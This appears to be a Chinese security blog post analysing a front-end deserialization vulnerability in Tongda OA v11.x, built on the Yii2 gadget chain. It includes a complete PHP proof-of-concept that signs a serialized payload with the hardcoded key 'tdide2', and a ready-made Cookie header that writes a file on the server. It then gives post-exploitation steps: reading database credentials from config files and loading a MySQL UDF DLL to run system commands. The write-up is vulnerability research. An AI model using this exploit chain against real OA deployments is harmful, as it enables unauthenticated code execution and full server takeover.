title: 通达OA V11.x 反序列化漏洞分析
author: Bmth
tags:
  - 
categories:
  - 代码审计
top_img: 'https://img-blog.csdnimg.cn/bcaa08e8cdbf495591802001f6b16262.png'
cover: 'https://img-blog.csdnimg.cn/bcaa08e8cdbf495591802001f6b16262.png'
date: 2023-09-27 17:30:00
---
![](https://img-blog.csdnimg.cn/bcaa08e8cdbf495591802001f6b16262.png)

快一年没分析过php反序列化了，恰巧前不久看到烽火台实验室发了一个通达oa的yii2反序列化漏洞，就趁这个机会好好学习一下

## 环境搭建
通达OA v11.10下载地址：[https://cdndown.tongda2000.com/oa/2019/TDOA11.10.exe](https://cdndown.tongda2000.com/oa/2019/TDOA11.10.exe)

网站源码部分在 webroot 目录下，使用了 zend 对源码进行加密，可以用 SeayDzend.exe 工具进行解密
![](https://img-blog.csdnimg.cn/6deb2610409b4e1496183cbe19355b3b.png)

安装之后的 php 版本为5.4.45，OA管理员用户名 admin，密码为空

## 漏洞分析
### 反序列化触发点
在通达中有一个模块`/general/appbuilder/web/index.php`，采用了yii框架实现，并未通过 auth.inc.php 文件来进行鉴权
![](https://img-blog.csdnimg.cn/773d9b7c307648b3ad97ce64f0668672.png)

用?截取url，需要满足url字符串存在`/portal/`以及`/gateway/`，并且不包含后续关键字即可访问对应的接口，构造
```
/general/appbuilder/web/portal/gateway/?
```
![](https://img-blog.csdnimg.cn/a2f45e00da0d4221a702b8e1d6391a85.png)

此时会加载视图`general/appbuilder/views/layouts/main.php`
![](https://img-blog.csdnimg.cn/49700e049a8149edb2482b0b170c244e.png)

这里会执行`yii\helpers\Html::csrfMetaTags()`方法，该方法的主要作用时用于生成csrf校验需要的meta标签
![](https://img-blog.csdnimg.cn/46db27cbdbaf4d84a93cf48e9d8cc61c.png)

yii默认开启csrf校验，所以`$request->enableCsrfValidation`为true，调用`$request->getCsrfToken()`

跟进`yii\web\Request::getCsrfToken()`
![](https://img-blog.csdnimg.cn/f04365253d5c49cbbda67c2e4e64d8aa.png)

`$this->_csrfToken`为null时，触发 loadCsrfToken 方法
![](https://img-blog.csdnimg.cn/e859332170e9478bb369c8acabd7f2af.png)

同样为默认设置`public $enableCsrfCookie = true`，跟进 getCookies 方法
![](https://img-blog.csdnimg.cn/1b1f4cc1b3b74816b2a5b13f0ea01ced.png)

跟进 loadCookies 方法
![](https://img-blog.csdnimg.cn/cf9db42b31684140827942c7d8a33839.png)

循环遍历`$_COOKIE`，并对每个字段的值用`Yii::$app->getSecurity()->validateData($value, $this->cookieValidationKey)`校验，如果不为 false 就进行反序列化

在通达OA中的`$this->cookieValidationKey`来自于配置文件`general/appbuilder/config/web.php`
![](https://img-blog.csdnimg.cn/12ccdc917e8e4fb7a5966e237e59ad5e.png)

为定值 tdide2

在`yii\base\Security::validateData()`方法中会通过 hash_hmac 对传入的key和value进行签名校验，加密方式为sha256
![](https://img-blog.csdnimg.cn/7219470c08af4c1c913c9a76b8077f26.png)

这里截取 Cookie 前半段的hash与 Cookie 后半段的pureData，将pureData hash加密后调用 compareString 与前半段hash值比较，如果相同返回序列化的内容，不同返回false

**所以说实际上传进来的值是hash+序列化值**

另外通达OA有全局的addslashes过滤，包括Cookie中的值，导致双引号会被转义
看到`inc/common.inc.php`
![](https://img-blog.csdnimg.cn/99fbf6a25dd64b3d94f14058a584d140.png)

如果Cookie中字段名称的前面几位字符为`_GET`这种，则不进行addslashes操作

### Yii2 反序列化链
由于通达oa解密后的代码会对yii框架部分代码有影响，出现乱码的情况，所以直接去github下载源码：
[https://github.com/yiisoft/yii2/releases/tag/2.0.13](https://github.com/yiisoft/yii2/releases/tag/2.0.13)
[https://github.com/yiisoft/yii2-redis/releases/tag/2.0.6](https://github.com/yiisoft/yii2-redis/releases/tag/2.0.6)

在`inc/vendor/yii2/yiisoft/yii2/BaseYii.php`中可以看到 Yii 版本为2.0.13-dev
![](https://img-blog.csdnimg.cn/2c8e065226634056bb2bf188918d5b42.png)

在`inc/vendor/yii2/yiisoft/extensions.php`里面可以看到Yii-redis的版本为2.0.6
![](https://img-blog.csdnimg.cn/ac6b637b86c941aca974358f36eaea57.png)

而在 Yii2 < 2.0.38 是存在反序列化利用链的，我们来看一下

入口在`yii\db\BatchQueryResult`中的`__destruct()`方法
![](https://img-blog.csdnimg.cn/5e910720e6804db9b694dc7ffe94f12a.png)

可以看到有两种方案，一种是直接调用该对象的close方法，一种是调用无法访问的方法触发`__call()`方法

我们这里选择`yii\db\DataReader`的 close 方法当跳板
![](https://img-blog.csdnimg.cn/c60f7775e6404d2682c39862cdf1dc39.png)

调用无法访问的方法closeCursor ，触发`yii\redis\Connection`的`__call()`方法
![](https://img-blog.csdnimg.cn/463820d81cce495ab70113a79e279190.png)

camel2words 这个函数的作用就是将驼峰式命名（camel case）的字符串转换为单词并以空格分隔
```php
public static function camel2words($name, $ucwords = true)
{
    $label = strtolower(trim(str_replace([
        '-',
        '_',
        '.',
    ], ' ', preg_replace('/(?<![A-Z])[A-Z]/', ' \0', $name))));

    return $ucwords ? ucwords($label) : $label;
}
```
然后转化为大写后在`$this->redisCommands`数组里面即可，设置
```php
$this->redisCommands = ["CLOSE CURSOR"];
```
跟进 executeCommand 方法
![](https://img-blog.csdnimg.cn/fded28280c1f4e3b95448e7b35ca3e16.png)

跟进 open 方法
![](https://img-blog.csdnimg.cn/87326796a73a461581c3a6d7d5506ac3.png)

这里会执行 stream_socket_client 函数，`$this->unixSocket`默认为false，通过tcp连接，`$this->hostname`自带的值为 localhost 不用管，`$this->port`需要指定为一个能通的端口就行，比如通达默认的数据库端口3336

连接成功后跳过三个if判断，调用到 initConnection() 方法
```php
const EVENT_AFTER_OPEN = 'afterOpen';
```
![](https://img-blog.csdnimg.cn/8cd758824df84ad382b6874df7fdea0c.png)

调用父类`yii\base\Component`的 trigger 方法，`$name`为定值 afterOpen
![](https://img-blog.csdnimg.cn/0ced92375b404cc38ee26613c8023f14.png)

需要满足`$this->_events["afterOpen"]`不为空，并且为二维数组，才能调用到
```php
call_user_func($handler[0], $event);
```
只有第一个参数可控，但是 call_user_func 支持调用一个类里面的方法：[https://www.php.net/manual/zh/function.call-user-func](https://www.php.net/manual/zh/function.call-user-func)

我们选择调用到`yii\rest\CreateAction`的 run 方法
![](https://img-blog.csdnimg.cn/83ab161d392b46b998a6abf3e737f49d.png)

即：
```php
$this->_events = ["afterOpen" => [[[new CreateAction(), "run"], "a"]]];
```


最终调用栈：
```
CreateAction.php:43, yii\rest\CreateAction->run()
Component.php:557, yii\base\Component->trigger()
Connection.php:571, yii\redis\Connection->initConnection()
Connection.php:541, yii\redis\Connection->open()
Connection.php:641, yii\redis\Connection->executeCommand()
Connection.php:606, yii\redis\Connection->__call()
DataReader.php:168, yii\redis\Connection->closeCursor()
DataReader.php:168, yii\db\DataReader->close()
BatchQueryResult.php:87, yii\db\BatchQueryResult->reset()
BatchQueryResult.php:77, yii\db\BatchQueryResult->__destruct()
```

参考：
[通达OA反序列化分析](https://forum.butian.net/share/2415)
[【新】通达OA前台反序列化漏洞分析](https://mp.weixin.qq.com/s/nOQuqt_mO0glY-KALc1Xiw)


## 漏洞利用
参考Macchiato师傅的POC：
```php
<?php

namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct()
        {
            $this->checkAccess = "assert";
            $this->id = "file_put_contents('test.php','test')";
        }
    }
}

namespace yii\base{
    use yii\rest\CreateAction;
    class Component{
        private $_events;

        public function __construct()
        {
            $this->_events = ["afterOpen" => [[[new CreateAction(), "run"], "a"]]];
        }
    }
}

namespace yii\redis{
    use yii\base\Component;
    class Connection extends Component{
        public $redisCommands;
        public $database = null;
        public $port = 0;

        public function __construct()
        {
            $this->redisCommands = ["CLOSE CURSOR"];
            $this->database = null;
            $this->port = 3336;
            parent::__construct();
        }
    }
}

namespace yii\db{
    use yii\redis\Connection;
    class DataReader{
        private $_statement;

        public function __construct()
        {
            $this->_statement = new Connection();
        }
    }
    class BatchQueryResult{
        private $_dataReader;

        public function __construct()
        {
            $this->_dataReader = new DataReader();
        }
    }
}
namespace {
    use yii\db\BatchQueryResult;
    $data = serialize(new BatchQueryResult());
    $crypt = hash_hmac("sha256",$data,"tdide2",false);
    $data = urlencode($data);
    $payload = $crypt . $data;
    echo $payload;
}
```
Cookie头传入即可
```
Cookie: _GET=0df0e27ad82ee48e0e8b8f4dd3d721213d303a557ba317ccb7c29c0419dc575bO%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CDataReader%22%3A1%3A%7Bs%3A29%3A%22%00yii%5Cdb%5CDataReader%00_statement%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A4%3A%7Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22CLOSE+CURSOR%22%3B%7Ds%3A8%3A%22database%22%3BN%3Bs%3A4%3A%22port%22%3Bi%3A3336%3Bs%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Bs%3A6%3A%22assert%22%3Bs%3A2%3A%22id%22%3Bs%3A36%3A%22file_put_contents%28%27test.php%27%2C%27test%27%29%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7Di%3A1%3Bs%3A1%3A%22a%22%3B%7D%7D%7D%7D%7D%7D
```
![](https://img-blog.csdnimg.cn/1420e37eaa6a49198ed3fc931ae4e6db.png)

写入的文件路径为`/general/appbuilder/web/test.php`

### Getshell
通达在安装时会默认配置 disable_functions 选项，禁用了常见的命令执行函数，并且通达OA一般都是 Windows 环境，大多数方法都不适用，后续版本中也关闭了COM组件，所以要找到一个新的姿势
```php
var_dump(get_cfg_var("disable_functions"));
```
得到
```
exec,shell_exec,system,passthru,proc_open,show_source,phpinfo,popen,dl,eval,proc_terminate,touch,escapeshellcmd,escapeshellarg
```
最终考虑使用 MYSQL UDF 来执行命令

找到通达OA的数据库配置文件`webroot/inc/oa_config.php`，通达OA的源码文件默认是加密的，但是配置文件是不加密的
![](https://img-blog.csdnimg.cn/2ce43227cf7b4b4b9ca31bd0b6c4f600.png)

也可以从`mysql5/my.ini`内找到 mysql 密码
![](https://img-blog.csdnimg.cn/23aa04ccec2541c7a0b907d0d5d57a04.png)

蚁剑连上数据库，先看一下插件目录
```sql
show variables like '%plugin%';
```
![](https://img-blog.csdnimg.cn/12807ee2415746e797d213847500bf98.png)

然后将 dll 文件上传到`mysql5/lib/plugin`目录下，执行
```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
select sys_eval('whoami');
```
成功创建自定义函数并调用命令
![](https://img-blog.csdnimg.cn/1477dbe218fa4d10a49908df045e7f12.png)

参考：
[某知名OA高版本getshell思路（附部分脚本）](https://mp.weixin.qq.com/s/vHR1mOmu2xf_irKRxhFxIw)
[某知名OA命令执行方法探索（续）](https://mp.weixin.qq.com/s/3dM2vMidSoH_wIWCk84epw)